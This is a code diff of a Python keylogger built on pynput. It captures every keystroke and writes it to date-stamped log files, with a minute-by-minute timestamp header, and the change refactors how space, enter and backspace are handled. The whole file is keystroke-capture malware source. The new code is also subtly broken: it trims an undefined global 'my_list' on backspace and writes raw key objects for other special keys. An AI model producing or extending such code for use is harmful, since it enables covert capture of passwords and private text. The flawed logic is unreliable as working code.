@@ -1,50 +1,36 @@
 from pynput import keyboard
 from datetime import datetime
-dict1 = {
-    "Key.space": " ",
-    "Key.ctrl": " Control ",
-    "Key.backspace":"backspace",
-    "Key.enter": "enter"
-}
+
 current_datetime = datetime.now()
 current_time = current_datetime.strftime("%d-%m-%Y")
 file_name = f"logs/{current_time}.txt"
 current_time = current_datetime.strftime("%d/%m/%Y %H:%M")
+
 print(current_time)
 with open(file_name, "w") as file:
     file.write("\n***** " + current_time + " *****\n")
 
 def on_press(key):
-    tempKey = ''
+    global my_list
     try:
-        tempKey = key.char
-
+        tempKey = str(key.char)
     except AttributeError:
-        tempKey = str(key)
-        if tempKey in dict1:
-            tempKey = dict1[tempKey]
-        else:
-            tempKey = " '" + tempKey + "' "
-        if spacial_keys(tempKey):
+        tempKey = key
+        if tempKey == keyboard.Key.backspace:
+            my_list = my_list[:-1]
             return
+        elif tempKey == keyboard.Key.enter:
+            tempKey = '\n'
+        elif tempKey == keyboard.Key.space:
+            tempKey = " "
+        else:
+            tempKey = tempKey
     AddToFile.add_to_file(tempKey)
 
-def spacial_keys(tempKey):
-    if tempKey == "backspace":
-        data = ''
-        with open(file_name, "r") as f:
-            data = f.read()
-        with open(file_name, "w") as f:
-            f.write(data[:-1])
-        return True
-    elif tempKey == "enter":
-        with open(file_name, "a") as f:
-            f.write('\n')
-        return True
-    return False
+
 
 class AddToFile():
-    def add_to_file(tempKey):
+    def add_to_file(Key):
        global current_time
        tempTime = datetime.now().strftime("%d/%m/%Y %H:%M")
        if tempTime != current_time:
@@ -52,7 +38,7 @@ class AddToFile():
                file.write("\n***** " + tempTime + " *****\n")
                current_time = tempTime
        with open(file_name, "a") as file:
-           file.write(str(tempKey))
+           file.write(str(Key))
        data = ''
        with open(file_name, "r") as f:
            data = f.read()
